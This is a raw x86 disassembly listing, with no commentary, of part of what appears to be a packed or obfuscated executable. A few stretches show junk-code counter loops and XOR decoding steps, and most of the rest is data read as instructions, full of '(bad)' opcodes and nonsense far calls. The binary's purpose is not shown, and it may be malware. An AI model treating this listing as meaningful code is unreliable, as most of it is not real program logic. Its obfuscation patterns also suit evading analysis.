  401862:	sub    ah,bl
  401864:	enter  0x9a7d,0xab
  401868:	(bad)  
  401869:	test   al,0xb3
  40186b:	mov    edi,0xa7f53a61
  401870:	mov    ds:0x5d92c916,al
  401875:	lods   eax,DWORD PTR ds:[esi]
  401876:	in     al,0x34
  401878:	(bad)  
  401879:	in     eax,dx
  40187a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40187b:	aaa    
  40187c:	mov    ecx,0x8cd9976c
  401881:	dec    eax
  401882:	loopne 0x40189a
  401884:	lea    edi,[ecx-0x65]
  401887:	push   ds
  401888:	mov    al,ds:0xc7b7fe01
  40188d:	sub    al,0x4
  40188f:	js     0x401813
  401891:	mov    fs,WORD PTR [ebx]
  401893:	adc    al,0xc1
  401895:	das    
  401896:	mov    al,ds:0x3ed96036
  40189b:	push   ds
  40189c:	dec    eax
  40189d:	icebp  
  40189e:	pop    ebx
  40189f:	or     eax,0xff94396d
  4018a4:	mov    dh,0x6
  4018a6:	jp     0x401899
  4018a8:	in     al,0xbb
  4018aa:	and    DWORD PTR [ecx+0x50701e28],edi
  4018b0:	mov    WORD PTR [esi+eiz*1],?
  4018b3:	mov    bl,0x5f
  4018b5:	mov    ah,0x7e
  4018b7:	sbb    eax,0x6f7d4d43
  4018bc:	or     al,BYTE PTR [ebp+0x2581c703]
  4018c2:	aaa    
  4018c3:	cmp    BYTE PTR [ebx+0x0],al
  4018c6:	add    BYTE PTR [eax],al
  4018c8:	add    BYTE PTR [eax],al
  4018ca:	jmp    0x4018dc
  4018cf:	mov    ebx,DWORD PTR ds:0x433837
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x433837,ebx
  4018dc:	cmp    DWORD PTR ds:0x433837,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x433837,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x43382b,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x433777,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x43376b
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x43382f,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x4337f3
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x433767,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x433733,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x43376f,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x433767,0x12
  40199d:	cmp    DWORD PTR ds:0x433767,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x433767,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x433867
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x433767,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x433767
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x433767,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x433767
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x433767,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433713,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x4337f7
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x4337eb,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x4337eb
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x4337eb,ebx
  401a2a:	cmp    DWORD PTR ds:0x4337eb,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x4337eb,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x4337eb,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x4337eb
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x4337eb,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433717,0x13
  401a7a:	cmp    DWORD PTR ds:0x433717,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433717,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433717,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433717
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433717,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433717
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433717,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x433777,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x433777
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x433777,ecx
  401ae9:	cmp    DWORD PTR ds:0x433777,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x433777,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x433777,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx+0x69]
  401b2b:	test   eax,0x795c0710
  401b30:	jle    0x401bb0
  401b32:	outs   dx,DWORD PTR ds:[esi]
  401b33:	jge    0x401bb3
  401b35:	jle    0x401abd
  401b37:	xchg   edi,eax
  401b38:	mov    ch,0x8
  401b3a:	dec    edi
  401b3b:	pop    ds
  401b3c:	leave  
  401b3d:	loop   0x401ade
  401b3f:	lods   al,BYTE PTR ds:[esi]
  401b40:	mov    al,0x15
  401b42:	cdq    
  401b43:	in     al,dx
  401b44:	adc    ch,BYTE PTR [eax-0x47f554e0]
  401b4a:	scas   al,BYTE PTR es:[edi]
  401b4b:	or     eax,0xbe2b7557
  401b50:	mov    dl,0x6b
  401b52:	cmp    BYTE PTR [eax],bl
  401b54:	retf   0x1994
  401b57:	jb     0x401b72
  401b59:	daa    
  401b5a:	xchg   ebp,eax
  401b5b:	cmp    ebp,DWORD PTR [edi]
  401b5d:	push   ebp
  401b5e:	mov    esi,0xdf3dd698
  401b63:	mov    DWORD PTR [ebx],edi
  401b65:	aas    
  401b66:	pop    ebx
  401b67:	xchg   al,al
  401b69:	cli    
  401b6a:	retf   0x5a7f
  401b6d:	sub    esp,esp
  401b6f:	mov    eax,0xdd59cfc8
  401b74:	leave  
  401b75:	inc    eax
  401b76:	add    esi,edi
  401b78:	aaa    
  401b79:	mov    ah,BYTE PTR [esi+0x8f78348]
  401b7f:	cmp    al,al
  401b81:	add    eax,0xa12dc575
  401b86:	cmp    edx,DWORD PTR [esi-0x43]
  401b89:	mov    eax,ds:0xa822e8a0
  401b8e:	inc    esp
  401b8f:	inc    ebx
  401b90:	xor    edx,esp
  401b92:	das    
  401b93:	sbb    al,0xfb
  401b95:	out    0xb,al
  401b97:	or     esp,DWORD PTR [esi-0x70687a77]
  401b9d:	call   0xa92f:0x6c3811
  401ba4:	(bad)  
  401ba5:	xor    eax,0x94a4ed85
  401baa:	inc    esi
  401bab:	dec    ebp
  401bac:	mov    edx,0xaa601453
  401bb1:	bound  ecx,QWORD PTR [ecx-0x13]
  401bb4:	dec    eax
  401bb5:	std    
  401bb6:	lock and eax,0x2dd79bae
  401bbc:	mov    edi,0x62fcdba8
  401bc1:	mov    esp,0x727c5532
  401bc6:	or     al,0x31
  401bc8:	pop    eax
  401bc9:	sti    
  401bca:	cli    
  401bcb:	pop    ecx
  401bcc:	retf   0xd3c8
  401bcf:	data16 sbb BYTE PTR [edi+0x48],bl
  401bd3:	jne    0x401bcc
  401bd5:	call   0x822ccf7a
  401bda:	sub    bh,BYTE PTR [ecx-0x3f]
  401bdd:	add    bh,BYTE PTR es:[ebx-0x71]
  401be1:	lods   al,BYTE PTR ds:[esi]
  401be2:	dec    DWORD PTR ss:[ecx-0x32]
  401be6:	arpl   WORD PTR [esp+ebp*4+0x4e],di
  401bea:	(bad)  
  401beb:	mov    ?,WORD PTR [ebx]
  401bed:	daa    
  401bee:	mov    ch,0x70
  401bf0:	sbb    ecx,DWORD PTR [esi]
  401bf2:	lea    esi,[edx]
  401bf4:	pop    eax
  401bf5:	sti    
  401bf6:	imul   ecx,DWORD PTR [edx+0x71c88398],0x28
  401bfd:	aas    
  401bfe:	add    DWORD PTR ds:0x2e91b57,esp
  401c04:	mov    cl,0x23
  401c06:	hlt    
  401c07:	fnstsw WORD PTR [ebx+0x14]
  401c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c0b:	jne    0x401bed
  401c0d:	inc    edx
  401c0e:	fnstcw WORD PTR [edx-0x7596082a]
  401c14:	dec    esi
  401c15:	sbb    eax,0xb1d0e03a
  401c1a:	adc    esi,edx
  401c1c:	sub    edi,ecx
  401c1e:	lods   eax,DWORD PTR ds:[esi]
  401c1f:	or     eax,0x9e567670
  401c24:	icebp  
  401c25:	jg     0x401c4f
  401c27:	push   ecx
  401c28:	adc    DWORD PTR [ecx+0x77a98107],esp
  401c2e:	cmovl  esi,ebp
  401c31:	stos   DWORD PTR es:[edi],eax
  401c32:	das    
  401c33:	adc    eax,0x84c407e2
  401c38:	dec    esp
  401c39:	jecxz  0x401c69
  401c3b:	pop    eax
  401c3c:	sahf   
  401c3d:	fild   WORD PTR [edx-0x78]
  401c40:	mov    ss,ecx
  401c42:	inc    edi
  401c43:	rol    dh,1
  401c45:	daa    
  401c46:	hlt    
  401c47:	ins    BYTE PTR es:[edi],dx
  401c48:	cmp    ebp,DWORD PTR [esi+0x522e094f]
  401c4e:	scas   al,BYTE PTR es:[edi]
  401c4f:	stc    
  401c50:	push   ecx
  401c51:	pop    esi
  401c52:	or     DWORD PTR [edi-0x23],0x290d440b
  401c59:	fcmovbe st,st(6)
  401c5b:	jp     0x401cbb
  401c5d:	iret   
  401c5e:	aam    0xba
  401c60:	mov    al,BYTE PTR [ebx]
  401c62:	push   DWORD PTR [esi-0x37cd0ad6]
  401c68:	call   0x30ef:0x2c9d53a0
  401c6f:	shl    BYTE PTR [esp+edi*4],cl
  401c72:	push   cs
  401c73:	jns    0x401ce3
  401c75:	arpl   WORD PTR [ecx-0x4f6febd8],bx
  401c7b:	sub    eax,edx
  401c7d:	mov    ch,0xa6
  401c80:	xchg   edi,eax
  401c81:	pusha  
  401c82:	jecxz  0x401ca6
  401c84:	dec    ecx
  401c85:	outs   dx,BYTE PTR ds:[esi]
  401c86:	push   edx
  401c87:	icebp  
  401c88:	loope  0x401c14
  401c8a:	out    dx,eax
  401c8b:	stos   BYTE PTR es:[edi],al
  401c8c:	jle    0x401c70
  401c8e:	mov    ch,0xb9
  401c90:	in     al,0xc3
  401c92:	inc    edx
  401c93:	(bad)
  401c97:	test   DWORD PTR [ebx],eax
  401c99:	add    ebx,ecx
  401c9b:	mov    edx,0xbac1b1f8
  401ca0:	or     DWORD PTR [esi+0x5a50092],edi
  401ca6:	push   0xb1c95f79
  401cab:	shr    edi,1
  401cad:	cwde   
  401cae:	adc    edx,edx
  401cb0:	pop    ebp
  401cb1:	test   al,0xa6
  401cb3:	mov    ch,0x52
  401cb5:	xchg   esi,eax
  401cb6:	(bad)  [esi]
  401cb8:	add    edx,ebp
  401cba:	retf   
  401cbb:	std    
  401cbc:	pop    edi
  401cbd:	add    eax,0x4f48a0fa
  401cc2:	(bad)  
  401cc4:	inc    ebx
  401cc5:	in     al,0x9e
  401cc7:	lock xchg esi,eax
  401cc9:	xor    ebx,DWORD PTR [ebx+0x4b]
  401ccc:	xchg   DWORD PTR [eax+0x2d28bfa0],ebp
  401cd2:	mov    eax,ecx
  401cd4:	int    0x97
  401cd6:	pop    esp
  401cd7:	lods   eax,DWORD PTR ds:[esi]
  401cd8:	jmp    0x70fc:0xc07002b3
  401cdf:	ja     0x401cc8
  401ce1:	int3   
  401ce2:	imul   ebx,DWORD PTR [edi-0x24],0x9faa18f4
  401ce9:	lahf   
  401cea:	lods   al,BYTE PTR ds:[esi]
  401ceb:	bound  ecx,QWORD PTR [esi-0x224d8c3b]
  401cf1:	mov    esi,0xc25b02cb
  401cf6:	mov    bh,BYTE PTR [edi-0x3e1d614]
  401cfc:	mov    cl,BYTE PTR [edx-0x79664d39]
  401d02:	sti    
  401d03:	stos   DWORD PTR es:[edi],eax
  401d04:	push   ecx
  401d05:	out    0x68,eax
  401d07:	in     eax,dx
  401d08:	(bad)  
  401d09:	fiadd  DWORD PTR [eax+0x7e0c4d55]
  401d0f:	ret    0x1b39
  401d12:	add    al,0xa2
  401d14:	push   edi
  401d15:	or     eax,DWORD PTR [edi-0x4e]
  401d18:	loop   0x401cf1
  401d1a:	scas   al,BYTE PTR es:[edi]
  401d1b:	jnp    0x401d0a
  401d1d:	sbb    DWORD PTR [ebp+0x6],esi
  401d20:	mov    bl,BYTE PTR [ebx-0x138265c0]
  401d26:	cli    
  401d27:	sub    edi,DWORD PTR [edi-0x43b35cd8]
  401d2d:	ds and bl,ah
  401d30:	jmp    0x401d09
  401d32:	mov    eax,0xdb31bb75
  401d37:	out    0x3,al
  401d39:	push   esp
  401d3a:	inc    ebp
  401d3b:	fs cmp al,0x1a
  401d3e:	aad    0x5
  401d40:	cld    
  401d41:	mov    ds:0x8768d45,eax
  401d46:	inc    ebp
  401d47:	lods   al,BYTE PTR ds:[esi]
  401d48:	not    bh
  401d4a:	push   ss
  401d4b:	xor    BYTE PTR [eax+0xfc38460],cl
  401d51:	popf   
  401d52:	dec    ecx
  401d53:	xor    BYTE PTR [ebx+0x2ed6d1b4],cl
  401d59:	test   BYTE PTR [edx-0x1f011c9a],dh
  401d5f:	mov    al,0x65
  401d61:	or     ecx,DWORD PTR [esi]
  401d63:	repnz inc edi
  401d65:	adc    bl,BYTE PTR [ecx+0x37113e88]
  401d6b:	mov    esi,0x42abc12f
  401d70:	out    dx,eax
  401d71:	dec    esp
  401d72:	mov    al,0x64
  401d74:	pop    esp
  401d75:	outs   dx,DWORD PTR ds:[esi]
  401d76:	fcomi  st,st(7)
  401d78:	fsub   QWORD PTR [esi+esi*1+0x2fb427e2]
  401d7f:	(bad)  
  401d80:	call   0x7953:0x826f37b7
  401d87:	pop    ecx
  401d88:	not    esi
  401d8a:	mov    eax,0x28a96950
  401d8f:	rcr    DWORD PTR [eax+0x4500c9af],1
  401d95:	dec    ebp
  401d96:	fwait
  401d97:	inc    edi
  401d98:	xor    cl,BYTE PTR [esi-0x17f115de]
  401d9e:	dec    ebx
  401d9f:	jno    0x401df9
  401da1:	(bad)  
  401da2:	outs   dx,BYTE PTR ds:[esi]
  401da3:	inc    edx
  401da4:	add    eax,0x644ad793
  401da9:	xchg   edi,eax
  401daa:	dec    ebx
  401dab:	inc    esp
  401dac:	ins    BYTE PTR es:[edi],dx
  401dad:	xchg   ebp,eax
  401dae:	inc    esp
  401daf:	adc    DWORD PTR [ebx+0x28],esi
  401db2:	clc    
  401db3:	loopne 0x401e27
  401db5:	cmp    edx,edx
  401db7:	aas    
  401db8:	aas    
  401db9:	sbb    BYTE PTR [ecx-0x45aa620a],0xbe
  401dc0:	enter  0x808a,0xde
  401dc4:	iret   
  401dc5:	jno    0x401d56
  401dc7:	cdq    
  401dc8:	mov    bh,0x1d
  401dca:	lahf   
  401dcb:	adc    BYTE PTR ds:0x9b475e3e,bh
  401dd1:	repnz dec esi
  401dd3:	or     eax,0x488cf271
  401dd8:	ins    BYTE PTR es:[edi],dx
  401dd9:	cli    
  401dda:	mov    esi,0xf09e31f5
  401ddf:	sti    
  401de0:	lds    ecx,FWORD PTR [edi+edx*8+0x21]
  401de4:	jg     0x401d9a
  401de6:	sbb    al,0x7d
  401de8:	push   edx
  401de9:	sahf   
  401dea:	loopne 0x401de8
  401dec:	pop    edx
  401ded:	fldcw  WORD PTR [esi]
  401def:	jmp    0x401e18
  401df1:	push   ecx
  401df2:	jmp    0xb137a33
  401df7:	fld    st(2)
  401df9:	xor    DWORD PTR [ebp+0x76c314ca],edi
  401dff:	inc    ebp
  401e00:	and    dl,ch
  401e02:	sub    al,0xe5
  401e04:	sbb    al,0xf9
  401e06:	scas   al,BYTE PTR es:[edi]
  401e07:	jp     0x401dca
  401e09:	mov    bh,cl
  401e0b:	jno    0x401de9
  401e0d:	mov    dh,0x41
  401e0f:	fucomip st,st(3)
  401e11:	add    bl,BYTE PTR [ebp+0x445e3b7e]
  401e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e18:	jg     0x401e7c
  401e1a:	cdq    
  401e1b:	pop    edi
  401e1c:	sub    al,0xa3
  401e1e:	ss dec ebx
  401e20:	sub    eax,0x203093f8
  401e25:	cli    
  401e26:	adc    dl,ch
  401e28:	and    DWORD PTR [edi],ebp
  401e2a:	fild   DWORD PTR [edx-0x40]
  401e2d:	cld    
  401e2e:	mov    eax,0x70525ab5
  401e33:	push   0x3d
  401e35:	cmp    eax,0xc4e0760d
  401e3a:	pop    ss
  401e3b:	adc    ebp,ebp
  401e3d:	ror    DWORD PTR [ecx],cl
  401e3f:	bound  ebp,QWORD PTR [eax-0x6d01be95]
  401e45:	hlt    
  401e46:	cmp    BYTE PTR [ebp+0x665eaf38],0xb6
  401e4d:	pop    ds
  401e4e:	pop    edx
  401e4f:	push   edi
  401e50:	pop    ss
  401e51:	mov    edi,0xa73ab63c
  401e56:	cdq    
  401e57:	ficom  DWORD PTR [eax-0x70d3fd93]
  401e5d:	aaa    
  401e5e:	dec    edi
  401e5f:	push   0x1c
  401e61:	cmp    BYTE PTR [esi+eiz*8],ch
  401e64:	jb     0x401ee4
  401e66:	arpl   WORD PTR [edx-0x3d296061],ax
  401e6c:	xchg   DWORD PTR [ebx-0x787e1352],eax
  401e72:	xchg   BYTE PTR [esi+0x331ad7f4],cl
  401e78:	dec    edx
  401e79:	pop    edi
  401e7a:	adc    al,0xe0
  401e7c:	sbb    eax,0x94fc4606
  401e81:	fsub   st,st(6)
  401e83:	into   
  401e84:	add    eax,0xfdf76a48
  401e89:	ja     0x401e78
  401e8b:	retf   
  401e8c:	js     0x401e38
  401e8e:	ds loop 0x401e8b
  401e91:	jg     0x401e75
  401e93:	or     ebx,DWORD PTR [esi+0x1377ee78]
  401e99:	outs   dx,DWORD PTR ds:[esi]
  401e9a:	repz mov ds,WORD PTR [ebx+edx*8-0xef2cf19]
  401ea2:	sub    ecx,esp
  401ea4:	mov    al,0xd9
  401ea6:	mov    ecx,0x72648791
  401eab:	pop    esi
  401eac:	push   edi
  401ead:	jo     0x401e3d
  401eaf:	pop    edx
  401eb0:	jl     0x401e59
  401eb2:	mov    ecx,0x5b0a1830
  401eb7:	into   
  401eb8:	stos   DWORD PTR es:[edi],eax
  401eb9:	outs   dx,DWORD PTR ds:[esi]
  401eba:	xchg   edi,eax
  401ebb:	xchg   edi,eax
  401ebc:	dec    eax
  401ebd:	cdq    
  401ebe:	sbb    eax,0x9040299f
  401ec3:	fdivr  DWORD PTR [eax]
  401ec5:	mov    bl,0x3c
  401ec7:	adc    bh,BYTE PTR [eax]
  401ec9:	rcr    ebx,0xd9
  401ecc:	dec    esp
  401ecd:	and    BYTE PTR [edi],ah
  401ecf:	mov    bl,ch
  401ed1:	pushf  
  401ed2:	in     eax,0xdf
  401ed4:	lds    esi,FWORD PTR [edi]
  401ed6:	shl    DWORD PTR [esi-0x610bcabf],1
  401edc:	outs   dx,BYTE PTR ds:[esi]
  401edd:	sub    DWORD PTR [edx],eax
  401edf:	cwde   
  401ee0:	push   edi
  401ee1:	push   ebx
  401ee2:	and    al,0xea
  401ee4:	nop
  401ee5:	popf   
  401ee6:	adc    bh,BYTE PTR [eax-0x453091eb]
  401eec:	ret    0x6109
  401eef:	pop    eax
  401ef0:	xor    ax,0x63fb
  401ef4:	scas   eax,DWORD PTR es:[edi]
  401ef5:	lods   al,BYTE PTR ds:[esi]
  401ef6:	(bad)  
  401ef7:	jne    0x401f66
  401ef9:	inc    esp
  401efa:	jbe    0x401ef7
  401efc:	ins    BYTE PTR es:[edi],dx
  401efd:	or     cl,cl
  401eff:	pop    edi
  401f00:	daa    
  401f01:	mov    esi,0x502e0b2f
  401f06:	sbb    DWORD PTR [eax],0xe262f191
  401f0c:	push   edx
  401f0d:	stos   DWORD PTR es:[edi],eax
  401f0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f0f:	daa    
  401f10:	popa   
  401f11:	es jmp 0xf360ee69
  401f17:	pmaxub mm6,mm1
  401f1a:	fistp  QWORD PTR [ebx+0x72]
  401f1d:	xchg   esp,eax
  401f1e:	pop    ss
  401f1f:	popf   
  401f20:	mov    dl,0x9c
  401f22:	adc    ch,ch
  401f24:	gs jb  0x401ebc
  401f27:	add    eax,edi
  401f29:	mov    ebx,DWORD PTR ds:0x43380b
  401f2f:	mov    ecx,DWORD PTR ds:0x433857
  401f35:	sub    ecx,ebx
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x433847
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43371b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	out    dx,eax
  401f5d:	xchg   DWORD PTR [edi+0x6a],esi
  401f60:	dec    ebp
  401f61:	add    eax,0x7d6f7e7e
  401f66:	jle    0x401fe6
  401f68:	push   0x40469f70
  401f6d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f6f:	fstp   DWORD PTR [esp+edi*2]
  401f72:	ret    
  401f73:	aad    0xbd
  401f75:	push   ds
  401f76:	mov    ecx,0x31b823c8
  401f7b:	mov    bh,0xe9
  401f7d:	mov    ebp,0x2c6a71f8
  401f82:	or     DWORD PTR [ebp+0x5f],esi
  401f85:	dec    ebx
  401f86:	sbb    BYTE PTR [ecx-0x23e76cf2],0xc3
  401f8d:	or     eax,0x5fbd9c77
  401f92:	jge    0x401faf
  401f94:	leave  
  401f95:	mov    ah,0x5d
  401f97:	or     esi,esi
  401f99:	adc    DWORD PTR [ebp-0x5d4d11f5],ebx
  401f9f:	imul   edx,DWORD PTR ds:0x6f0567b7,0x80cbe15e
  401fa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401faa:	dec    ecx
  401fab:	ss in  eax,dx
  401fad:	lock and eax,0x5a170dd3
  401fb3:	gs loopne 0x401f4e
  401fb6:	inc    dx
  401fb8:	dec    edi
  401fb9:	mov    ah,dh
  401fbb:	jo     0x401fc1
  401fbd:	xchg   cl,bl
  401fbf:	fnsave [eax-0x1d]
  401fc2:	cmp    edx,DWORD PTR [esi-0x13]
  401fc5:	pop    ss
  401fc6:	xchg   edx,eax
  401fc7:	jbe    0x402016
  401fc9:	aam    0xa5
  401fcb:	inc    edx
  401fcc:	mov    ah,0x3
  401fce:	and    eax,0x87acd340
  401fd3:	cli    
  401fd4:	xchg   esi,eax
  401fd5:	sbb    DWORD PTR [ebx],esi
  401fd7:	xor    bl,BYTE PTR [ebx]
  401fd9:	lahf   
  401fda:	mov    esp,0x59eccaf4
  401fdf:	mov    eax,ds:0x243142d
  401fe4:	inc    ebx
  401fe5:	outs   dx,BYTE PTR ds:[esi]
  401fe6:	xchg   esi,eax
  401fe7:	stc    
  401fe8:	out    dx,al
  401fe9:	fucomip st,st(1)
  401feb:	push   cs
  401fec:	sub    eax,0xb024977c
  401ff1:	test   al,0x2e
  401ff3:	call   0x4a76:0xde9f8a50
  401ffa:	lods   eax,DWORD PTR ds:[esi]
  401ffb:	and    al,0xe9
  401ffd:	jne    0x402056
  401fff:	jmp    0xdac9:0x6314d6ec
  402006:	mov    esi,es
  402008:	in     eax,0x56
  40200a:	div    DWORD PTR ds:0x92bcdd7e
  402010:	sub    esp,ecx
  402012:	scas   al,BYTE PTR es:[edi]
  402013:	cmp    al,0x83
  402015:	arpl   WORD PTR [edx+0x491bbe0d],cx
  40201b:	mov    edx,0xdeec6d96
  402020:	mov    dl,0x68
  402022:	ins    DWORD PTR es:[edi],dx
  402023:	mov    ah,0x6c
  402025:	ror    edx,1
  402027:	mov    eax,ds:0xe56a0ea5
  40202c:	fimul  WORD PTR [eax+ecx*4+0x68]
  402030:	lods   al,BYTE PTR ds:[esi]
  402031:	add    bh,BYTE PTR [ebp-0x6e]
  402034:	adc    edi,eax
  402036:	stos   BYTE PTR es:[edi],al
  402037:	add    al,0xdf
  402039:	sub    esi,ebx
  40203b:	dec    ecx
  40203c:	mov    WORD PTR [ecx],gs
  40203e:	popa   
  40203f:	hlt    
  402040:	or     dl,ah
  402042:	(bad)  
  402044:	and    al,0xd8
  402046:	es jg  0x4020b1
  402049:	push   cs
  40204a:	scas   al,BYTE PTR es:[edi]
  40204b:	or     edi,DWORD PTR [ebx+edi*8-0x4619d0f6]
  402052:	sbb    ecx,DWORD PTR [edi-0x2]
  402055:	ins    DWORD PTR es:[edi],dx
  402056:	xchg   edx,eax
  402057:	scas   eax,DWORD PTR es:[edi]
  402058:	arpl   WORD PTR [eax+0x1b772fda],bx
  40205e:	and    DWORD PTR [ecx+0x35fcaa07],ebp
  402064:	jo     0x4020cf
  402066:	push   0x1b9e6b98
  40206b:	mov    ch,0x80
  40206d:	les    ebp,FWORD PTR ds:0xe25cb419
  402073:	imul   eax,ebp,0xffffffc3
  402076:	cwde   
  402077:	popf   
  402078:	push   es
  402079:	mov    ebp,0x56bc8210
  40207e:	leave  
  40207f:	data16 cmp dl,BYTE PTR [ebx+0x66]
  402083:	test   DWORD PTR [ecx],esi
  402085:	push   ebx
  402086:	cmp    DWORD PTR [ecx-0x43b36efb],0x1a
  40208d:	inc    esi
  40208e:	sub    BYTE PTR [esi+0x1a],al
  402091:	sbb    al,0x73
  402093:	fsubrp st(2),st
  402095:	mov    ds:0x26b01486,al
  40209a:	jp     0x402105
  40209c:	push   ecx
  40209d:	mov    ah,cl
  40209f:	inc    edi
  4020a0:	cmp    BYTE PTR [ebx-0x72dbd04b],dh
  4020a6:	or     ecx,esp
  4020a8:	(bad)  
  4020aa:	test   eax,0xaf4e4683
  4020af:	xchg   ebp,eax
  4020b0:	cmp    dl,ah
  4020b2:	jg     0x4020ed
  4020b4:	mov    bl,0x2e
  4020b6:	je     0x4020d9
  4020b8:	arpl   WORD PTR [eax],si
  4020ba:	ds and eax,0x929c8827
  4020c0:	ja     0x40210f
  4020c2:	loop   0x402063
  4020c4:	leave  
  4020c5:	in     eax,dx
  4020c6:	test   DWORD PTR [edi+0x266b97fa],eax
  4020cc:	cmp    BYTE PTR [esi-0x312dd659],bl
  4020d2:	test   BYTE PTR [ebp+0x3e],0x22
  4020d6:	pop    edx
  4020d7:	add    DWORD PTR [eax],edi
  4020d9:	sbb    dl,BYTE PTR [eax+eiz*2-0x36]
  4020dd:	jnp    0x4020f5
  4020df:	pop    bp
  4020e1:	nop
  4020e2:	push   eax
  4020e3:	lds    edi,FWORD PTR [ebp+0x57]
  4020e6:	sub    BYTE PTR [ecx],0xf1
  4020e9:	mov    dh,0x49
  4020eb:	(bad)  
  4020ec:	sbb    eax,0xdc890bdb
  4020f1:	loop   0x40211a
  4020f3:	pop    ecx
  4020f4:	inc    esi
  4020f5:	fcomi  st,st(7)
  4020f7:	cwde   
  4020f8:	add    ebp,DWORD PTR [esp+esi*4]
  4020fb:	jb     0x402128
  4020fd:	out    0x5f,al
  4020ff:	push   ds
  402100:	pusha  
  402101:	retf   0x57f
  402104:	mov    edx,0xfe4dab98
  402109:	mov    dl,0x4f
  40210b:	retf   0xb75c
  40210e:	jbe    0x402152
  402110:	fdivr  QWORD PTR [ebp-0x41321464]
  402116:	inc    esi
  402117:	sbb    DWORD PTR [esi+0x17],edx
  40211a:	mov    ecx,0x13998a25
  40211f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402120:	pushf  
